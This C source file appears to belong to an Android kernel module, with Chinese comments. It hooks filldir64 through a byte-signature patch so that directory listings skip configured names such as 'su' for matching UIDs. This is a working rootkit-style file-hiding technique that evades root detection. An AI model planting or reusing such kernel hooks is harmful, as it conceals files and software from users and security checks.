/* SPDX-License-Identifier: GPL-2.0 */
/*
 * filldir.c - filldir64 hook（目录列举过滤）
 *
 * 作用
 * ----
 * 让 ls / readdir 时看不到被遮的目标。没有它的话，
 * "cat /data/local/tmp" 仍会列出 su 这个名字，只是 stat 它返回 ENOENT。
 *
 * 为什么选 filldir64 而不是 ksys_getdents64
 * ------------------------------------------
 * ksys_getdents64 开头是 sub sp,sp,#0x70（d101c3ff），
 * 要搬迁它就得多处理栈调整；而 filldir64 有标准序言，
 * 且它每次只处理一个目录项，name/namelen 直接可用，
 * 过滤逻辑比在 getdents 缓冲区里做偏移计算简单可靠得多。
 *
 * 本机签名：
 *   +0x00 stp x29,x30,[sp,#-96]!    a9ba7bfd
 *   +0x04 str x27,[sp,#16]          f9000bfb
 */

#include <linux/module.h>
#include <linux/fs.h>
#include <linux/types.h>

#include "ps_types.h"
#include "ps_hook.h"
#include "ps_match.h"
#include "ps_guard.h"
#include "ps_core.h"

typedef int (*ps_filldir_fn)(void *buf, const char *name, int namelen,
			     loff_t pos, u64 ino, unsigned int d_type);

static struct ps_hook ps_hook_filldir;

static int ps_replace_filldir(void *buf, const char *name, int namelen,
			      loff_t pos, u64 ino, unsigned int d_type)
{
	ps_filldir_fn real;
	const struct ps_config *cfg = ps_cfg_get();
	bool drop = false;

	real = (ps_filldir_fn)ps_hook_real(&ps_hook_filldir);

	if (unlikely(!cfg || !cfg->enabled || !cfg->hide_dirents))
		return real(buf, name, namelen, pos, ino, d_type);

	if (!ps_guard_enter())
		return real(buf, name, namelen, pos, ino, d_type);

	if (namelen > 0 && ps_match_uid(cfg, current_fsuid().val) &&
	    ps_match_name(cfg, name, (size_t)namelen))
		drop = true;

	ps_guard_leave();

	/*
	 * 返回 0 而不是 1：filldir 约定非 0 = "缓冲区满，停止"，
	 * 返回 0 = "跳过这一项继续"。这是继续枚举下去的语义。
	 */
	return drop ? 0 : real(buf, name, namelen, pos, ino, d_type);
}

const struct ps_hook_ops ps_ops_filldir = {
	.name    = "filldir64",
	.symbol  = "filldir64",
	.replace = ps_replace_filldir,
	.sig     = { 0xa9ba7bfdu, 0xf9000bfbu },
	.hook    = &ps_hook_filldir,
};
